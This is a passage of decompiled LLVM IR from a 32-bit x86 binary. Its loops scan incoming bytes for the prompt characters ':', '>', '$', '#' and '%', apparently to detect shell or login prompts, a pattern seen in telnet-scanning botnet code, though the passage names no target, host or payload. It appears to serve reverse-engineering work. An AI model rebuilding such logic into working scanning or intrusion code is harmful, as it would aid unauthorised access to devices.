  store i32 %v0_80507c2, i32* %eax.global-to-local, align 4
  store i32 %v0_80507c2, i32* @ebp, align 4
  %v10_80507cc = icmp eq i32 %v0_80507c2, -1
  %v1_80507cf = icmp eq i1 %v10_80507cc, false
  br i1 %v1_80507cf, label %dec_label_pc_8050c27, label %dec_label_pc_80505e2.loopexit12.loopexit

dec_label_pc_80507e0:                             ; preds = %dec_label_pc_8050654
  %v1_80507e0 = add i32 %v0_8050654, 24
  %v2_80507e0 = inttoptr i32 %v1_80507e0 to i32*
  %v3_80507e0 = load i32, i32* %v2_80507e0, align 4
  %v1_80507e3 = add i32 %v3_80507e0, -1
  store i32 %v1_80507e3, i32* %eax.global-to-local, align 4
  %tmp141 = icmp slt i32 %v1_80507e3, 1
  br i1 %tmp141, label %dec_label_pc_80505e2.loopexit12.loopexit, label %dec_label_pc_80507ec.preheader

dec_label_pc_80507ec.preheader:                   ; preds = %dec_label_pc_80507e0
  %v7_80507ec.pre = load i32, i32* @edx, align 4
  %v2_80507ec = add i32 %v0_8050654, 28
  br label %dec_label_pc_80507ec

dec_label_pc_80507ec:                             ; preds = %dec_label_pc_80507ec.preheader, %dec_label_pc_805081d
  %v7_80507ec = phi i32 [ %v7_80507ec.pre, %dec_label_pc_80507ec.preheader ], [ %v9_80507ec, %dec_label_pc_805081d ]
  %v0_8050d5f = phi i32 [ %v1_80507e3, %dec_label_pc_80507ec.preheader ], [ %v1_805081d, %dec_label_pc_805081d ]
  %v3_80507ec = add i32 %v2_80507ec, %v0_8050d5f
  %v4_80507ec = inttoptr i32 %v3_80507ec to i8*
  %v5_80507ec = load i8, i8* %v4_80507ec, align 1
  %v6_80507ec = zext i8 %v5_80507ec to i32
  %v8_80507ec = and i32 %v7_80507ec, -256
  %v9_80507ec = or i32 %v6_80507ec, %v8_80507ec
  store i32 %v9_80507ec, i32* %edx.global-to-local, align 4
  %v10_80507f0 = icmp eq i8 %v5_80507ec, 58
  br i1 %v10_80507f0, label %dec_label_pc_8050d5f, label %dec_label_pc_80507f9

dec_label_pc_80507f9:                             ; preds = %dec_label_pc_80507ec
  %v10_80507f9 = icmp eq i8 %v5_80507ec, 62
  br i1 %v10_80507f9, label %dec_label_pc_8050d5f, label %dec_label_pc_8050802

dec_label_pc_8050802:                             ; preds = %dec_label_pc_80507f9
  %v10_8050802 = icmp eq i8 %v5_80507ec, 36
  br i1 %v10_8050802, label %dec_label_pc_8050d5f, label %dec_label_pc_805080b

dec_label_pc_805080b:                             ; preds = %dec_label_pc_8050802
  %v10_805080b = icmp eq i8 %v5_80507ec, 35
  br i1 %v10_805080b, label %dec_label_pc_8050d5f, label %dec_label_pc_8050814

dec_label_pc_8050814:                             ; preds = %dec_label_pc_805080b
  %v10_8050814 = icmp eq i8 %v5_80507ec, 37
  br i1 %v10_8050814, label %dec_label_pc_8050d5f, label %dec_label_pc_805081d

dec_label_pc_805081d:                             ; preds = %dec_label_pc_8050814
  %v1_805081d = add i32 %v0_8050d5f, -1
  %v8_805081d = icmp eq i32 %v1_805081d, 0
  store i32 %v1_805081d, i32* %eax.global-to-local, align 4
  %v1_805081e = icmp eq i1 %v8_805081d, false
  br i1 %v1_805081e, label %dec_label_pc_80507ec, label %dec_label_pc_80505e2.backedge

dec_label_pc_8050825:                             ; preds = %dec_label_pc_8050654
  %v1_8050825 = add i32 %v0_8050654, 24
  %v2_8050825 = inttoptr i32 %v1_8050825 to i32*
  %v3_8050825 = load i32, i32* %v2_8050825, align 4
  %v1_8050828 = add i32 %v3_8050825, -1
  store i32 %v1_8050828, i32* %eax.global-to-local, align 4
  %tmp142 = icmp slt i32 %v1_8050828, 1
  br i1 %tmp142, label %dec_label_pc_80505e2.loopexit12.loopexit, label %dec_label_pc_8050831.preheader

dec_label_pc_8050831.preheader:                   ; preds = %dec_label_pc_8050825
  %v7_8050831.pre = load i32, i32* @edx, align 4
  %v2_8050831 = add i32 %v0_8050654, 28
  br label %dec_label_pc_8050831

dec_label_pc_8050831:                             ; preds = %dec_label_pc_8050831.preheader, %dec_label_pc_8050862
  %v7_8050831 = phi i32 [ %v7_8050831.pre, %dec_label_pc_8050831.preheader ], [ %v9_8050831, %dec_label_pc_8050862 ]
  %v0_8050c6d = phi i32 [ %v1_8050828, %dec_label_pc_8050831.preheader ], [ %v1_8050862, %dec_label_pc_8050862 ]
  %v3_8050831 = add i32 %v2_8050831, %v0_8050c6d
  %v4_8050831 = inttoptr i32 %v3_8050831 to i8*
  %v5_8050831 = load i8, i8* %v4_8050831, align 1
  %v6_8050831 = zext i8 %v5_8050831 to i32
  %v8_8050831 = and i32 %v7_8050831, -256
  %v9_8050831 = or i32 %v6_8050831, %v8_8050831
  store i32 %v9_8050831, i32* %edx.global-to-local, align 4
  %v10_8050835 = icmp eq i8 %v5_8050831, 58
  br i1 %v10_8050835, label %dec_label_pc_8050c6d, label %dec_label_pc_805083e

dec_label_pc_805083e:                             ; preds = %dec_label_pc_8050831
  %v10_805083e = icmp eq i8 %v5_8050831, 62
  br i1 %v10_805083e, label %dec_label_pc_8050c6d, label %dec_label_pc_8050847

dec_label_pc_8050847:                             ; preds = %dec_label_pc_805083e
  %v10_8050847 = icmp eq i8 %v5_8050831, 36
  br i1 %v10_8050847, label %dec_label_pc_8050c6d, label %dec_label_pc_8050850

dec_label_pc_8050850:                             ; preds = %dec_label_pc_8050847
  %v10_8050850 = icmp eq i8 %v5_8050831, 35
  br i1 %v10_8050850, label %dec_label_pc_8050c6d, label %dec_label_pc_8050859

dec_label_pc_8050859:                             ; preds = %dec_label_pc_8050850
  %v10_8050859 = icmp eq i8 %v5_8050831, 37
  br i1 %v10_8050859, label %dec_label_pc_8050c6d, label %dec_label_pc_8050862

dec_label_pc_8050862:                             ; preds = %dec_label_pc_8050859
  %v1_8050862 = add i32 %v0_8050c6d, -1
  %v8_8050862 = icmp eq i32 %v1_8050862, 0
  store i32 %v1_8050862, i32* %eax.global-to-local, align 4
  %v1_8050863 = icmp eq i1 %v8_8050862, false
  br i1 %v1_8050863, label %dec_label_pc_8050831, label %dec_label_pc_80505e2.backedge

dec_label_pc_8050870:                             ; preds = %dec_label_pc_8050654
  %v0_8050870 = load i32, i32* @esp, align 4
  %v1_8050873 = add i32 %v0_8050870, -16
  %v2_8050873 = inttoptr i32 %v1_8050873 to i32*
  store i32 26, i32* %v2_8050873, align 4
  %v2_8050875 = call i32 @function_8051300(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050875, i32* %eax.global-to-local, align 4
  %v0_805087a = load i32, i32* @esp, align 4
  %v1_805087a = inttoptr i32 %v0_805087a to i32*
  %v2_805087a = load i32, i32* %v1_805087a, align 4
  store i32 %v2_805087a, i32* %eax.global-to-local, align 4
  %v3_805087a = add i32 %v0_805087a, 4
  %v1_805087b = inttoptr i32 %v3_805087a to i32*
  %v2_805087b = load i32, i32* %v1_805087b, align 4
  store i32 %v2_805087b, i32* %edx.global-to-local, align 4
  %v1_805087c = add i32 %v0_805087a, 1880
  store i32 %v1_805087c, i32* %ecx.global-to-local, align 4
  store i32 %v1_805087c, i32* %v1_805087b, align 4
  store i32 26, i32* %v1_805087a, align 4
  %v3_8050886 = call i32 @function_8051250(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8050886, i32* %eax.global-to-local, align 4
  %v0_805088b = load i32, i32* @esp, align 4
  %v1_805088b = add i32 %v0_805088b, 1880
  %v2_805088b = inttoptr i32 %v1_805088b to i32*
  %v3_805088b = load i32, i32* %v2_805088b, align 4
  %v1_8050892 = add i32 %v3_805088b, -1
  store i32 %v1_8050892, i32* %edx.global-to-local, align 4
  %v2_8050893 = add i32 %v0_805088b, -4
  %v3_8050893 = inttoptr i32 %v2_8050893 to i32*
  store i32 %v1_8050892, i32* %v3_8050893, align 4
  %v2_8050894 = add i32 %v0_805088b, -8
  %v3_8050894 = inttoptr i32 %v2_8050894 to i32*
  store i32 %v3_8050886, i32* %v3_8050894, align 4
  %v0_8050895 = load i32, i32* @edi, align 4
  %v1_8050895 = add i32 %v0_8050895, 24
  %v2_8050895 = inttoptr i32 %v1_8050895 to i32*
  %v3_8050895 = load i32, i32* %v2_8050895, align 4
  store i32 %v3_8050895, i32* %eax.global-to-local, align 4
  %v2_8050898 = add i32 %v0_805088b, -12
  %v3_8050898 = inttoptr i32 %v2_8050898 to i32*
  store i32 %v3_8050895, i32* %v3_8050898, align 4
  %v1_8050899 = add i32 %v0_805088b, 32
  %v2_8050899 = inttoptr i32 %v1_8050899 to i32*
  %v3_8050899 = load i32, i32* %v2_8050899, align 4
  store i32 %v3_8050899, i32* %eax.global-to-local, align 4
  %v2_805089d = add i32 %v0_805088b, -16
  %v3_805089d = inttoptr i32 %v2_805089d to i32*
  store i32 %v3_8050899, i32* %v3_805089d, align 4
  %v0_805089e = call i32 @function_8051d00()
  %v0_80508a3 = load i32, i32* @esp, align 4
  %v1_80508a6 = add i32 %v0_805089e, 1
  %v8_80508a6 = icmp eq i32 %v1_80508a6, 0
  store i32 %v1_80508a6, i32* %eax.global-to-local, align 4
  %v1_80508a7 = icmp eq i1 %v8_80508a6, false
  %v1_8050e54 = add i32 %v0_80508a3, 16
  %v2_8050e54 = inttoptr i32 %v1_8050e54 to i32*
  store i32 26, i32* %v2_8050e54, align 4
  %v2_8050e56 = call i32 @function_8051280(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050e56, i32* %eax.global-to-local, align 4
  %v0_8050e5b = load i32, i32* @esp, align 4
  %v1_8050e5b = inttoptr i32 %v0_8050e5b to i32*
  br i1 %v1_80508a7, label %dec_label_pc_8050e51, label %dec_label_pc_80508ad

dec_label_pc_80508ad:                             ; preds = %dec_label_pc_8050870
  store i32 25, i32* %v1_8050e5b, align 4
  %v2_80508be = call i32 @function_8051300(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_80508be, i32* %eax.global-to-local, align 4
  %v0_80508c3 = load i32, i32* @esp, align 4
  %v1_80508c3 = inttoptr i32 %v0_80508c3 to i32*
  %v3_80508c3 = add i32 %v0_80508c3, 4
  %v1_80508c4 = inttoptr i32 %v3_80508c3 to i32*
  %v1_80508c5 = add i32 %v0_80508c3, 1880
  store i32 %v1_80508c5, i32* %eax.global-to-local, align 4
  store i32 %v1_80508c5, i32* %v1_80508c4, align 4
  store i32 25, i32* %v1_80508c3, align 4
  %v3_80508cf = call i32 @function_8051250(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_80508cf, i32* %eax.global-to-local, align 4
  %v0_80508d4 = load i32, i32* @esp, align 4
  %v1_80508d4 = add i32 %v0_80508d4, 1880
  %v2_80508d4 = inttoptr i32 %v1_80508d4 to i32*
  %v3_80508d4 = load i32, i32* %v2_80508d4, align 4
  %v1_80508db = add i32 %v3_80508d4, -1
  store i32 %v1_80508db, i32* %edx.global-to-local, align 4
  %v2_80508dc = add i32 %v0_80508d4, -4
  %v3_80508dc = inttoptr i32 %v2_80508dc to i32*
  store i32 %v1_80508db, i32* %v3_80508dc, align 4
  %v2_80508dd = add i32 %v0_80508d4, -8
  %v3_80508dd = inttoptr i32 %v2_80508dd to i32*
  store i32 %v3_80508cf, i32* %v3_80508dd, align 4
  %v0_80508de = load i32, i32* @edi, align 4
  %v1_80508de = add i32 %v0_80508de, 24
  %v2_80508de = inttoptr i32 %v1_80508de to i32*
  %v3_80508de = load i32, i32* %v2_80508de, align 4
  store i32 %v3_80508de, i32* @esi, align 4
  %v2_80508e1 = add i32 %v0_80508d4, -12
  %v3_80508e1 = inttoptr i32 %v2_80508e1 to i32*
  store i32 %v3_80508de, i32* %v3_80508e1, align 4
  %v1_80508e2 = add i32 %v0_80508d4, 32
  %v2_80508e2 = inttoptr i32 %v1_80508e2 to i32*
  %v3_80508e2 = load i32, i32* %v2_80508e2, align 4
  store i32 %v3_80508e2, i32* @ebx, align 4
  %v2_80508e6 = add i32 %v0_80508d4, -16
  %v3_80508e6 = inttoptr i32 %v2_80508e6 to i32*
  store i32 %v3_80508e2, i32* %v3_80508e6, align 4
  %v0_80508e7 = call i32 @function_8051d00()
  store i32 %v0_80508e7, i32* %eax.global-to-local, align 4
  %v0_80508ec = load i32, i32* @esp, align 4
  store i32 %v0_80508e7, i32* @ebp, align 4
  %v1_80508f1 = add i32 %v0_80508ec, 16
  %v2_80508f1 = inttoptr i32 %v1_80508f1 to i32*
  store i32 25, i32* %v2_80508f1, align 4
  %v2_80508f3 = call i32 @function_8051280(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_80508f3, i32* %eax.global-to-local, align 4
  %v0_80508f8 = load i32, i32* @esp, align 4
  %v0_80508fb = load i32, i32* @ebp, align 4
  %v10_80508fb = icmp eq i32 %v0_80508fb, -1
  br i1 %v10_80508fb, label %dec_label_pc_80505e2.loopexit12.loopexit, label %dec_label_pc_8050904

dec_label_pc_8050904:                             ; preds = %dec_label_pc_80508ad
  %tmp143 = icmp slt i32 %v0_80508fb, 1
  br i1 %tmp143, label %dec_label_pc_8050a83, label %dec_label_pc_805090c

dec_label_pc_805090c:                             ; preds = %dec_label_pc_8050904
  %v0_805090c = load i32, i32* @edi, align 4
  %v1_805090c = inttoptr i32 %v0_805090c to i32*
  %v2_805090c = load i32, i32* %v1_805090c, align 4
  store i32 %v2_805090c, i32* %edx.global-to-local, align 4
  %v1_805090e = add i32 %v0_805090c, 16
  %v2_805090e = inttoptr i32 %v1_805090e to i32*
  %v3_805090e = load i32, i32* %v2_805090e, align 4
  store i32 %v3_805090e, i32* %eax.global-to-local, align 4
  %v2_8050911 = add i32 %v0_80508f8, 52
  %v3_8050911 = inttoptr i32 %v2_8050911 to i32*
  store i32 %v2_805090c, i32* %v3_8050911, align 4
  %v0_8050915 = load i32, i32* @edi, align 4
  %v1_8050915 = add i32 %v0_8050915, 20
  %v2_8050915 = inttoptr i32 %v1_8050915 to i32*
  %v3_8050915 = load i32, i32* %v2_8050915, align 4
  store i32 %v3_8050915, i32* %edx.global-to-local, align 4
  %v0_8050918 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050918 = load i32, i32* @esp, align 4
  %v2_8050918 = add i32 %v1_8050918, 1872
  %v3_8050918 = inttoptr i32 %v2_8050918 to i32*
  store i32 %v0_8050918, i32* %v3_8050918, align 4
  %v0_805091f = load i32, i32* %edx.global-to-local, align 4
  %v1_805091f = trunc i32 %v0_805091f to i16
  %v2_805091f = load i32, i32* @esp, align 4
  %v3_805091f = add i32 %v2_805091f, 1882
  %v4_805091f = inttoptr i32 %v3_805091f to i16*
  store i16 %v1_805091f, i16* %v4_805091f, align 2
  %v0_8050927 = call i32 @function_805221f()
  store i32 %v0_8050927, i32* %eax.global-to-local, align 4
  %tmp144 = icmp slt i32 %v0_8050927, 1
  br i1 %tmp144, label %dec_label_pc_805108e, label %dec_label_pc_8050934

dec_label_pc_8050934:                             ; preds = %dec_label_pc_80510af, %dec_label_pc_805108e, %dec_label_pc_805090c
  %v0_8050934 = load i32, i32* @esp, align 4
  %v0_8050937 = load i32, i32* @edi, align 4
  %v1_8050937 = add i32 %v0_8050937, 4
  %v2_8050937 = inttoptr i32 %v1_8050937 to i32*
  %v3_8050937 = load i32, i32* %v2_8050937, align 4
  store i32 %v3_8050937, i32* @esi, align 4
  %v2_805093a = add i32 %v0_8050934, -16
  %v3_805093a = inttoptr i32 %v2_805093a to i32*
  store i32 %v3_8050937, i32* %v3_805093a, align 4
  %v1_805093b = call i32 @function_80521f1(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_805093b, i32* %eax.global-to-local, align 4
  %v0_8050940 = load i32, i32* @edi, align 4
  %v1_8050940 = add i32 %v0_8050940, 4
  %v2_8050940 = inttoptr i32 %v1_8050940 to i32*
  store i32 -1, i32* %v2_8050940, align 4
  %v0_8050947 = load i32, i32* @edi, align 4
  %v1_8050947 = add i32 %v0_8050947, 12
  %v2_8050947 = inttoptr i32 %v1_8050947 to i32*
  store i32 0, i32* %v2_8050947, align 4
  br label %dec_label_pc_8050951

dec_label_pc_8050951:                             ; preds = %dec_label_pc_8050a83, %dec_label_pc_8050cfa, %dec_label_pc_80509ce, %dec_label_pc_8051010, %dec_label_pc_8050e84, %dec_label_pc_8050c81, %dec_label_pc_8050d73, %dec_label_pc_8050c2f, %dec_label_pc_8050bde, %dec_label_pc_80506eb, %dec_label_pc_8050dec, %dec_label_pc_8050934
  %v0_8050951 = load i32, i32* @edi, align 4
  %v1_8050951 = add i32 %v0_8050951, 24
  %v2_8050951 = inttoptr i32 %v1_8050951 to i32*
  %v3_8050951 = load i32, i32* %v2_8050951, align 4
  store i32 %v3_8050951, i32* @edx, align 4
  store i32 %v3_8050951, i32* %eax.global-to-local, align 4
  %v1_8050956 = load i32, i32* @ebp, align 4
  %v2_8050956 = sub i32 %v3_8050951, %v1_8050956
  %v8_8050956 = xor i32 %v1_8050956, %v3_8050951
  %v9_8050956 = xor i32 %v2_8050956, %v3_8050951
  %v10_8050956 = and i32 %v9_8050956, %v8_8050956
  %v11_8050956 = icmp slt i32 %v10_8050956, 0
  %v12_8050956 = icmp eq i32 %v2_8050956, 0
  %v13_8050956 = icmp slt i32 %v2_8050956, 0
  %v3_8050958 = icmp ne i1 %v13_8050956, %v11_8050956
  %v4_8050958 = or i1 %v12_8050956, %v3_8050958
  br i1 %v4_8050958, label %dec_label_pc_805095c, label %dec_label_pc_805095a

dec_label_pc_805095a:                             ; preds = %dec_label_pc_8050951
  store i32 %v1_8050956, i32* @edx, align 4
  br label %dec_label_pc_805095c

dec_label_pc_805095c:                             ; preds = %dec_label_pc_8050951, %dec_label_pc_805095a
  %v1_805095c = phi i32 [ %v3_8050951, %dec_label_pc_8050951 ], [ %v1_8050956, %dec_label_pc_805095a ]
  %v2_805095c = sub i32 %v3_8050951, %v1_805095c
  store i32 %v2_805095c, i32* %eax.global-to-local, align 4
  store i32 %v2_805095c, i32* %v2_8050951, align 4
  %v0_8050961 = load i32, i32* @ebx, align 4
  %v1_8050961 = load i32, i32* @esp, align 4
  %v2_8050961 = add i32 %v1_8050961, -4
  %v3_8050961 = inttoptr i32 %v2_8050961 to i32*
  store i32 %v0_8050961, i32* %v3_8050961, align 4
  %v0_8050962 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050962 = add i32 %v1_8050961, -8
  %v3_8050962 = inttoptr i32 %v2_8050962 to i32*
  store i32 %v0_8050962, i32* %v3_8050962, align 4
  %v1_8050963 = add i32 %v1_8050961, 16
  %v2_8050963 = inttoptr i32 %v1_8050963 to i32*
  %v3_8050963 = load i32, i32* %v2_8050963, align 4
  %v1_8050967 = load i32, i32* @edx, align 4
  %v2_8050967 = add i32 %v1_8050967, %v3_8050963
  store i32 %v2_8050967, i32* %eax.global-to-local, align 4
  %v2_8050969 = add i32 %v1_8050961, -12
  %v3_8050969 = inttoptr i32 %v2_8050969 to i32*
  store i32 %v2_8050967, i32* %v3_8050969, align 4
  %v3_805096a = load i32, i32* %v2_8050963, align 4
  store i32 %v3_805096a, i32* %ecx.global-to-local, align 4
  %v2_805096e = add i32 %v1_8050961, -16
  %v3_805096e = inttoptr i32 %v2_805096e to i32*
  store i32 %v3_805096a, i32* %v3_805096e, align 4
  %v4_805096f = call i32 @function_8052753(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805096f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050654

dec_label_pc_805097c:                             ; preds = %dec_label_pc_8050654
  %v1_805097c = add i32 %v0_8050654, 24
  %v2_805097c = inttoptr i32 %v1_805097c to i32*
  %v3_805097c = load i32, i32* %v2_805097c, align 4
  %v1_805097f = add i32 %v3_805097c, -1
  store i32 %v1_805097f, i32* %eax.global-to-local, align 4
  %tmp145 = icmp slt i32 %v1_805097f, 1
  br i1 %tmp145, label %dec_label_pc_80505e2.loopexit12.loopexit, label %dec_label_pc_8050988

dec_label_pc_8050988:                             ; preds = %dec_label_pc_805097c
  %v2_8050988 = add i32 %v0_8050654, 27
  %v3_8050988 = add i32 %v2_8050988, %v3_805097c
  %v4_8050988 = inttoptr i32 %v3_8050988 to i8*
  %v5_8050988 = load i8, i8* %v4_8050988, align 1
  %v6_8050988 = zext i8 %v5_8050988 to i32
  %v7_8050988 = load i32, i32* @edx, align 4
  %v8_8050988 = and i32 %v7_8050988, -256
  %v9_8050988 = or i32 %v8_8050988, %v6_8050988
  store i32 %v9_8050988, i32* %edx.global-to-local, align 4
  %v10_805098c = icmp eq i8 %v5_8050988, 62
  br i1 %v10_805098c, label %dec_label_pc_80509ba.thread, label %dec_label_pc_8050991

dec_label_pc_8050991:                             ; preds = %dec_label_pc_8050988
  %v10_8050991 = icmp eq i8 %v5_8050988, 58
  br i1 %v10_8050991, label %dec_label_pc_80509ba.thread, label %dec_label_pc_8050996

dec_label_pc_8050996:                             ; preds = %dec_label_pc_8050991, %dec_label_pc_80509b5
  %v0_80509a5 = phi i32 [ %v1_80509a5, %dec_label_pc_80509b5 ], [ %v1_805097f, %dec_label_pc_8050991 ]
  %v7_80509ac = phi i32 [ %v9_80509ac, %dec_label_pc_80509b5 ], [ %v9_8050988, %dec_label_pc_8050991 ]
  %v1_8050996 = trunc i32 %v7_80509ac to i8
  %v10_8050996 = icmp eq i8 %v1_8050996, 36
  br i1 %v10_8050996, label %dec_label_pc_80509ba, label %dec_label_pc_805099b

dec_label_pc_805099b:                             ; preds = %dec_label_pc_8050996
  %v10_805099b = icmp eq i8 %v1_8050996, 35
  br i1 %v10_805099b, label %dec_label_pc_80509ba, label %dec_label_pc_80509a0

dec_label_pc_80509a0:                             ; preds = %dec_label_pc_805099b
  %v10_80509a0 = icmp eq i8 %v1_8050996, 37
  br i1 %v10_80509a0, label %dec_label_pc_80509ba, label %dec_label_pc_80509a5

dec_label_pc_80509a5:                             ; preds = %dec_label_pc_80509a0
  %v1_80509a5 = add i32 %v0_80509a5, -1
  %v8_80509a5 = icmp eq i32 %v1_80509a5, 0
  store i32 %v1_80509a5, i32* %eax.global-to-local, align 4
  br i1 %v8_80509a5, label %dec_label_pc_80505e2.backedge, label %dec_label_pc_80509ac

dec_label_pc_80509ac:                             ; preds = %dec_label_pc_80509a5
  %v3_80509ac = add i32 %v2_8050988, %v0_80509a5
  %v4_80509ac = inttoptr i32 %v3_80509ac to i8*
  %v5_80509ac = load i8, i8* %v4_80509ac, align 1
  %v6_80509ac = zext i8 %v5_80509ac to i32
  %v8_80509ac = and i32 %v7_80509ac, -256
  %v9_80509ac = or i32 %v6_80509ac, %v8_80509ac
  store i32 %v9_80509ac, i32* %edx.global-to-local, align 4
  %v10_80509b0 = icmp eq i8 %v5_80509ac, 58
  br i1 %v10_80509b0, label %dec_label_pc_80509ba, label %dec_label_pc_80509b5

dec_label_pc_80509b5:                             ; preds = %dec_label_pc_80509ac
  %v10_80509b5 = icmp eq i8 %v5_80509ac, 62
  %v1_80509b8 = icmp eq i1 %v10_80509b5, false
  br i1 %v1_80509b8, label %dec_label_pc_8050996, label %dec_label_pc_80509ba

dec_label_pc_80509ba.thread:                      ; preds = %dec_label_pc_8050991, %dec_label_pc_8050988
  store i32 %v3_805097c, i32* @ebp, align 4
  br label %dec_label_pc_80509c6

dec_label_pc_80509ba:                             ; preds = %dec_label_pc_80509b5, %dec_label_pc_80509ac, %dec_label_pc_80509a0, %dec_label_pc_805099b, %dec_label_pc_8050996
  %v0_80509ba = phi i32 [ %v0_80509a5, %dec_label_pc_8050996 ], [ %v0_80509a5, %dec_label_pc_805099b ], [ %v0_80509a5, %dec_label_pc_80509a0 ], [ %v1_80509a5, %dec_label_pc_80509ac ], [ %v1_80509a5, %dec_label_pc_80509b5 ]
  %v1_80509ba = add i32 %v0_80509ba, 1
  store i32 %v1_80509ba, i32* @ebp, align 4
  %v10_80509bd = icmp eq i32 %v0_80509ba, -2
  br i1 %v10_80509bd, label %dec_label_pc_80505e2.loopexit12.loopexit, label %dec_label_pc_80509c6

dec_label_pc_80509c6:                             ; preds = %dec_label_pc_80509ba.thread, %dec_label_pc_80509ba
  %v1_80509ba160 = phi i32 [ %v3_805097c, %dec_label_pc_80509ba.thread ], [ %v1_80509ba, %dec_label_pc_80509ba ]
  %tmp146 = icmp slt i32 %v1_80509ba160, 1
  br i1 %tmp146, label %dec_label_pc_8050a83, label %dec_label_pc_80509ce

dec_label_pc_80509ce:                             ; preds = %dec_label_pc_80509c6
  %v0_80509ce = load i32, i32* @esp, align 4
  %v1_80509d1 = add i32 %v0_80509ce, -16
  %v2_80509d1 = inttoptr i32 %v1_80509d1 to i32*
  store i32 20, i32* %v2_80509d1, align 4
  %v2_80509d3 = call i32 @function_8051300(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_80509d3, i32* %eax.global-to-local, align 4
  %v0_80509d8 = load i32, i32* @esp, align 4
  %v1_80509d8 = inttoptr i32 %v0_80509d8 to i32*
  %v2_80509d8 = load i32, i32* %v1_80509d8, align 4
  store i32 %v2_80509d8, i32* %eax.global-to-local, align 4
  %v3_80509d8 = add i32 %v0_80509d8, 4
  %v1_80509d9 = inttoptr i32 %v3_80509d8 to i32*
  %v2_80509d9 = load i32, i32* %v1_80509d9, align 4
  store i32 %v2_80509d9, i32* %edx.global-to-local, align 4
  %v1_80509da = add i32 %v0_80509d8, 1888
  store i32 %v1_80509da, i32* %eax.global-to-local, align 4
  store i32 %v1_80509da, i32* %v1_80509d9, align 4
  store i32 20, i32* %v1_80509d8, align 4
  %v3_80509e4 = call i32 @function_8051250(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_80509e4, i32* %eax.global-to-local, align 4
  %v0_80509e9 = load i32, i32* @esp, align 4
  %v1_80509e9 = add i32 %v0_80509e9, -4
  %v2_80509e9 = inttoptr i32 %v1_80509e9 to i32*
  store i32 16384, i32* %v2_80509e9, align 4
  %v1_80509ee = add i32 %v0_80509e9, 1888
  %v2_80509ee = inttoptr i32 %v1_80509ee to i32*
  %v3_80509ee = load i32, i32* %v2_80509ee, align 4
  store i32 %v3_80509ee, i32* @esi, align 4
  %v2_80509f5 = add i32 %v0_80509e9, -8
  %v3_80509f5 = inttoptr i32 %v2_80509f5 to i32*
  store i32 %v3_80509ee, i32* %v3_80509f5, align 4
  %v2_80509f6 = add i32 %v0_80509e9, -12
  %v3_80509f6 = inttoptr i32 %v2_80509f6 to i32*
  store i32 %v3_80509e4, i32* %v3_80509f6, align 4
  %v0_80509f7 = load i32, i32* @edi, align 4
  %v1_80509f7 = add i32 %v0_80509f7, 4
  %v2_80509f7 = inttoptr i32 %v1_80509f7 to i32*
  %v3_80509f7 = load i32, i32* %v2_80509f7, align 4
  store i32 %v3_80509f7, i32* @ebx, align 4
  %v2_80509fa = add i32 %v0_80509e9, -16
  %v3_80509fa = inttoptr i32 %v2_80509fa to i32*
  store i32 %v3_80509f7, i32* %v3_80509fa, align 4
  %v0_80509fb = call i32 @function_8052934()
  store i32 %v0_80509fb, i32* %eax.global-to-local, align 4
  %v0_8050a00 = load i32, i32* @esp, align 4
  %v1_8050a03 = add i32 %v0_8050a00, 28
  %v2_8050a03 = inttoptr i32 %v1_8050a03 to i32*
  store i32 16384, i32* %v2_8050a03, align 4
  %v1_8050a08 = add i32 %v0_8050a00, 24
  %v2_8050a08 = inttoptr i32 %v1_8050a08 to i32*
  store i32 2, i32* %v2_8050a08, align 4
  %v1_8050a0a = add i32 %v0_8050a00, 20
  %v2_8050a0a = inttoptr i32 %v1_8050a0a to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b26.10 to i32), i32* %v2_8050a0a, align 4
  %v0_8050a0f = load i32, i32* @edi, align 4
  %v1_8050a0f = add i32 %v0_8050a0f, 4
  %v2_8050a0f = inttoptr i32 %v1_8050a0f to i32*
  %v3_8050a0f = load i32, i32* %v2_8050a0f, align 4
  store i32 %v3_8050a0f, i32* %ecx.global-to-local, align 4
  %v2_8050a12 = add i32 %v0_8050a00, 16
  %v3_8050a12 = inttoptr i32 %v2_8050a12 to i32*
  store i32 %v3_8050a0f, i32* %v3_8050a12, align 4
  %v0_8050a13 = call i32 @function_8052934()
  store i32 %v0_8050a13, i32* %eax.global-to-local, align 4
  %v0_8050a18 = load i32, i32* @esp, align 4
  %v1_8050a18 = inttoptr i32 %v0_8050a18 to i32*
  store i32 20, i32* %v1_8050a18, align 4
  %v2_8050a1f = call i32 @function_8051280(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050a1f, i32* %eax.global-to-local, align 4
  %v0_8050a27 = load i32, i32* @edi, align 4
  %v1_8050a27 = add i32 %v0_8050a27, 12
  %v2_8050a27 = inttoptr i32 %v1_8050a27 to i32*
  store i32 8, i32* %v2_8050a27, align 4
  br label %dec_label_pc_8050951

dec_label_pc_8050a33:                             ; preds = %dec_label_pc_8050654
  %v1_8050a33 = add i32 %v0_8050654, 24
  %v2_8050a33 = inttoptr i32 %v1_8050a33 to i32*
  %v3_8050a33 = load i32, i32* %v2_8050a33, align 4
  %v1_8050a36 = add i32 %v3_8050a33, -1
  store i32 %v1_8050a36, i32* %eax.global-to-local, align 4
  %tmp147 = icmp slt i32 %v1_8050a36, 1
  br i1 %tmp147, label %dec_label_pc_80505e2.loopexit12.loopexit, label %dec_label_pc_8050a3f.preheader

dec_label_pc_8050a3f.preheader:                   ; preds = %dec_label_pc_8050a33
  %v7_8050a3f.pre = load i32, i32* @edx, align 4
  %v2_8050a3f = add i32 %v0_8050654, 28
  br label %dec_label_pc_8050a3f

dec_label_pc_8050a3f:                             ; preds = %dec_label_pc_8050a3f.preheader, %dec_label_pc_8050a70
